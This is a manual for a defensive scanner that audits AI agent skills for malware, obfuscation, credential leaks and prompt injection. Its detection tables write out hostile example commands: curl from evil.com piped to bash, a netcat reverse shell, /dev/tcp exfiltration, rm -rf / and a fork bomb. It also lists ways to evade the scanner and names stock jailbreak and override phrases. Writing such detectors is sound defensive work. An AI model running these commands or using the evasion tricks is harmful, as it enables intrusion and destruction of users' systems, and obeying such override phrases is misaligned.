# skill-validator Skill Manual

The **skill-validator** is an automated security scanner that audits skills for malware, obfuscation, structural violations, and hidden Base64 payloads. It runs as a single-pass Python CLI tool and produces human-readable or JSON reports.

## Table of Contents
- [Getting Started](#-getting-started)
- [How to Use](#-how-to-use)
- [CLI Reference](#-cli-reference)
- [Architecture](#-architecture)
- [Detection Catalog](#-detection-catalog)
  - [🔴 Bash Injection — Critical](#-bash-injection--critical-8-patterns)
  - [🟡 Bash Injection — Warning](#-bash-injection--warning-9-patterns)
  - [🔵 Bash Injection — Info](#-bash-injection--info-4-patterns)
  - [🔎 Static Analysis Keywords](#-static-analysis-keywords-9-patterns)
  - [🤖 AI Threat Detection](#-ai-threat-detection-opt-in)
  - [🔐 PII & Credential Leaks](#-pii--credential-leaks-n8n-enriched)
  - [🕵️ Obfuscation & Payload Detection](#️-obfuscation--payload-detection-5-checks)
  - [📁 Structural Integrity](#-structural-integrity-5-checks)
- [Security & Limitations](#️-security--limitations)
- [CI/CD Integration](#-cicd-integration)
- [Troubleshooting](#-troubleshooting)

## 🚀 Getting Started

### Prerequisites
*   **Python 3.8+**: No external dependencies required (stdlib only).

### Installation
Ensure the skill is located at:
`.agent/skills/skill-validator`

### Quick Start

**Option A: Scan an Untrusted/Third-Party Skill (Recommended)**
Use the "Full Audit" wrapper. It forces maximum security (AI scan on, `.scanignore` off) and guides you through verification.
```bash
python3 .agent/skills/skill-validator/scripts/full_audit.py /path/to/skill
```

**Option B: Scan Your Own Trusted Skill**
Use the standard validator. It respects `.scanignore` (good for local dev) and skips the slow AI scan by default.
```bash
python3 .agent/skills/skill-validator/scripts/validate.py /path/to/skill
```

## 💡 How to Use

### 1. Direct CLI Invocation
Run the validator directly against any skill directory:
```bash
python3 scripts/validate.py <skill-path> [--json] [--no-scanignore] [--strict]
```

### 2. Agent-Triggered
The skill is triggered by phrases like "validate this skill", "scan for security", or "audit this skill":
> **User**: "Validate the `my-new-skill` skill for security issues."
> **Agent**: Runs the validator, reads the output, and reports findings.

### 3. Agent-Assisted Verification (Phase 3)
For deep analysis of suspicious content (flagged as Info/Warning), use the specialized LLM prompts located in `references/prompts/`.

1.  **Select Prompt**:
    - `jailbreak_check.md`: Uses n8n-derived logic to detect subtle prompt injection or jailbreaks.
    - `alignment_check.md`: Verifies if the content stays within business scope.
2.  **Instruct Agent**: "Using the prompt in `references/prompts/jailbreak_check.md`, analyze this text: [suspicious_content]"
3.  **Result**: The Agent acts as a second opinion, catching semantics that regex misses.

## 🛠 CLI Reference

| Flag | Description | Default |
| :--- | :--- | :--- |
| `<skill-path>` | Path to the skill directory to scan. | Required |
| `--json` | Output structured JSON (for CI/CD pipelines). | Off |
| `--no-scanignore` | Ignore `.scanignore` files. **Always use for untrusted skills.** | Off |
| `--strict` | Exit code 2 on warnings (for CI/CD gating). | Off |
| `--ai-scan` | Enable AI threat detection (Prompt Injection, Jailbreaks). | Off |
| `--version` | Print version and exit. | — |

### Exit Codes

| Code | Meaning |
| :--- | :--- |
| `0` | PASSED (clean or info/warnings only) |
| `1` | FAILED (critical or error issues) |
| `2` | FAILED strict (warnings in `--strict` mode) |

## 🏗 Architecture

```
skill-validator/
├── SKILL.md                          # Skill manifest
├── .scanignore                       # Files to skip during content scan
├── scripts/
│   ├── validate.py                   # Main orchestrator (single os.walk)
│   └── scanners/
│       ├── patterns.py               # Shared regex patterns (Base64-encoded)
│       ├── bash_scanner.py           # Shell injection detection
│       ├── static_analyzer.py        # Keywords, obfuscation, Base64 payloads
│       └── structure_check.py        # SKILL.md frontmatter & directory layout
├── assets/
│   └── report_format_example.md      # Suggested report template
├── examples/
│   └── usage_example.md              # Usage walkthrough
└── references/
    └── guidelines.md                 # OWASP patterns & CWE references
```

### Data Flow

```mermaid
graph LR
    A[Skill Directory] --> B[validate.py]
    B --> C[structure_check]
    C --> C2[File Integrity Cross-Ref]
    B --> D[os.walk — single pass]
    D --> D2[Polyglot Check]
    D --> E[bash_scanner]
    D --> F[static_analyzer]
    D -.->|--ai-scan| I[ai_scanner]
    I --> H
    F --> G[Base64 decode + re-scan]
    F --> G2[Hex decode + re-scan]
    C & C2 & D2 & E & F & G & G2 --> H[Risk Level: SAFE / CAUTION / DANGER]
    H --> I[Text or JSON Report]
```



## 🔍 Detection Catalog

### 🔴 Bash Injection — Critical (8 patterns)

Immediate blockers. If any of these fire, **DO NOT use the skill**.

| Pattern | What It Catches | Attack Vector | CWE |
| :--- | :--- | :--- | :--- |
| `curl.*\|.*bash` | `curl http://evil.com \| bash` | Download and immediately execute remote code | CWE-78 |
| `wget.*\|.*bash` | Same via `wget` | | CWE-78 |
| `curl.*\|.*sh` | Variant using `sh` instead of `bash` | Some systems only have `sh` | CWE-78 |
| `wget.*\|.*sh` | Same via `wget` | | CWE-78 |
| `wget -O ... && bash` | `wget -O /tmp/p.sh && bash /tmp/p.sh` | Two-step download + execute (harder to spot) | CWE-78 |
| `curl -o ... && bash` | Same via `curl` | | CWE-78 |
| `rm -rf /` | Recursive deletion of root filesystem | System destruction | CWE-73 |
| `:(){ ...};:` | Fork bomb | Denial of service (infinite process fork) | CWE-400 |

### 🟡 Bash Injection — Warning (9 patterns)

Require manual review. May be legitimate, but are common attack vectors.

| Pattern | What It Catches | Why It's Suspicious |
| :--- | :--- | :--- |
| `nc -...` | `nc -lvp 4444 -e /bin/bash` | Netcat with flags = reverse shell listener |
| `netcat ...` | Direct netcat usage | Network backdoor |
| `/dev/tcp/` | `echo > /dev/tcp/evil.com/80` | Bash-specific reverse shell (no external tools needed) |
| `chmod +s` | Setting the setuid bit | Privilege escalation — any user runs the binary as root |
| `sudo ...` | Usage of sudo | Elevated privileges |
| `eval ...` | Shell eval | Dynamic code execution from a string |
| `>> ~/.bashrc` | Writing to .bashrc | Persistence — code runs on every login |
| `>> ~/.zshrc` | Writing to .zshrc | Same for Zsh users |
| `>> ~/.profile` | Writing to .profile | Same for login shells |

### 🔵 Bash Injection — Info (4 patterns)

Low-risk signals. Usually legitimate, but worth noting.

| Pattern | What It Catches |
| :--- | :--- |
| `exec ...` | Process replacement — may be normal for shell scripts |
| `export VAR=` | Exporting environment variables |
| `printenv` | Dumping all environment variables (could exfiltrate secrets) |
| `env > ...` | Writing environment to file/pipe |

### 🔎 Static Analysis Keywords (9 patterns)

High-risk Python/JS functions that could be used for code injection or data exfiltration.

| Pattern | Category | Why It's Suspicious |
| :--- | :--- | :--- |
| `eval()` | Control Flow | Executes arbitrary string as code — attacker-controlled input becomes code |
| `exec()` | Control Flow | Same as eval but for statements |
| `subprocess.*` | System | Spawns OS processes — potential shell injection with `shell=True` |
| `os.system()` | System | Direct shell command execution |
| `base64.b64decode` | Obfuscation | May hide malicious payloads in encoded strings |
| `codecs.decode` | Obfuscation | Alternative encoding — can hide payloads via ROT13, etc. |
| `requests.get()` | Network | Outbound HTTP — potential data exfiltration |
| `urllib.request` | Network | Same via stdlib |
| `socket.*` | Network | Raw sockets — reverse shells, C2 beaconing |

### 🤖 AI Threat Detection (Opt-in)

Activated with `--ai-scan`. Detects attacks targeting LLMs and AI agents.

| Pattern Category | Examples | Why It's Dangerous |
| :--- | :--- | :--- |
| **Prompt Injection** | `Ignore previous instructions`, `Forget all prior instructions` | Overrides system prompts to hijack agent behavior. |
| **Jailbreaks** | `Do Anything Now`, `roleplay as unrestricted`, `simulate unfiltered` | Bypasses safety filters to generate prohibited content. |
| **Harmful Content** | `Write malware`, `Generate keylogger`, `Steal credentials` | Direct requests for malicious artifacts. |
| **Indirect Injection** | `override ethical constraints`, `ignore safety constraints` | Subtle attempts to disable safety protocols (n8n-inspired). |

### 🔐 PII & Credential Leaks (n8n Enriched)

Detects sensitive data leaks using patterns derived from n8n Guardrails.

| Category | Patterns / Prefixes |
| :--- | :--- |
| **Credentials** | `sk-` (Legacy), `sk-proj-` (New OpenAI), `ghp_` (GitHub), `xox` (Slack), `AKIA` (AWS), `Bearer` tokens |
| **PII** | Email addresses (RFC 5322), IP Addresses (IPv4), SSN-like patterns (`ddd-dd-dddd`) |

> **Note**: These patterns are also checked inside **Base64** and **Hex** payloads if `static_analyzer.py` finds them.


### 🕵️ Obfuscation & Payload Detection (5 checks)

Catches attackers who try to hide malicious code through encoding or disguise.

| Check | How It Works | Severity |
| :--- | :--- | :--- |
| **Long lines** | Lines > 500 chars flagged — minified code hides payloads from manual review | Warning |
| **High entropy** | Shannon entropy > 5.8 on lines > 50 chars — random-looking strings may be encrypted payloads | Info |
| **Base64 payloads** | Finds Base64 strings ≥ 20 chars, **decodes** them, and **re-scans** decoded content against ALL patterns above | Critical / Warning |
| **Hex-encoded payloads** | Finds `\xNN` sequences (4+ consecutive), **decodes** them, and **re-scans** decoded content against ALL patterns above | Critical / Warning |
| **Polyglot files** | Checks if text-extension files (`.py`, `.sh`, `.md`, etc.) start with binary magic bytes (ELF, PE, Mach-O, ZIP, etc.) | Critical |

### 📁 Structural Integrity (5 checks)

Validates that the skill follows the "Rich Skill" format and that SKILL.md is honest about its contents.

| Check | What It Validates | Severity |
| :--- | :--- | :--- |
| **SKILL.md exists** | The skill manifest must be present | Critical |
| **Frontmatter fields** | `name`, `description`, `tier`, `version` must exist and be non-empty | Error |
| **Quoted values** | YAML frontmatter with quoted strings (e.g., `"value"`) is parsed correctly | — |
| **Standard directories** | `scripts/`, `examples/`, `assets/`, `references/` should exist and be non-empty | Info / Warning |
| **File integrity cross-ref** | File paths mentioned in SKILL.md (backtick-quoted or markdown links) are checked against the filesystem | Warning |

## ⚠️ Security & Limitations

### File Size Limit
Files > 10MB are skipped to prevent OOM. A warning is reported.

### `.scanignore` Security Risk
The `.scanignore` file is loaded from the **scanned skill's directory**. An attacker can ship a `.scanignore` that hides their malicious files.

> [!CAUTION]
> **Always use `--no-scanignore` when scanning untrusted/third-party skills.**

### Known Bypass Techniques
The validator uses regex-based static analysis. These techniques can bypass it:
1.  **String splitting**: `"cu" + "rl"` defeats pattern matching.
2.  **Variable indirection**: `cmd="curl"; $cmd http://evil.com | bash`.
3.  **Encoding layers**: Base64-inside-Base64, ROT13, hex encoding.
4.  **Dynamic imports**: `__import__("os").system("...")`.
5.  **Polyglot files**: ~~Valid in multiple languages simultaneously.~~ **Now detected** via magic number checking.

## 🔄 CI/CD Integration

### GitHub Actions Example
```yaml
- name: Validate Skill
  run: |
    result=$(python3 scripts/validate.py ./skills/my-skill --json --no-scanignore --strict)
    echo "$result"
    # Exit code 0 = clean, 1 = critical/error, 2 = warnings (strict)
```

### JSON Output Schema
```json
{
  "skill": "my-skill",
  "risk_level": "SAFE | CAUTION | DANGER",
  "issues": [
    {"type": "critical|error|warning|info", "message": "...", "line": 42}
  ],
  "summary": {"critical": 0, "error": 0, "warning": 0, "info": 0}
}
```

## ❓ Troubleshooting

*   **Scanner flags its own source code?** This is expected — `patterns.py` contains Base64-encoded patterns to detect `eval`, `exec`, etc. Use `.scanignore` for self-scans.
*   **Too many false positives?** Documentation files may contain attack patterns for reference. Add them to `.scanignore` for trusted skills.
*   **"Scanner import failed" error?** Ensure you're running from the correct directory. The `scripts/` folder must be accessible.
*   **Large files skipped?** Files > 10MB are intentionally skipped. Check if the file is a legitimate text file or a binary with a wrong extension.
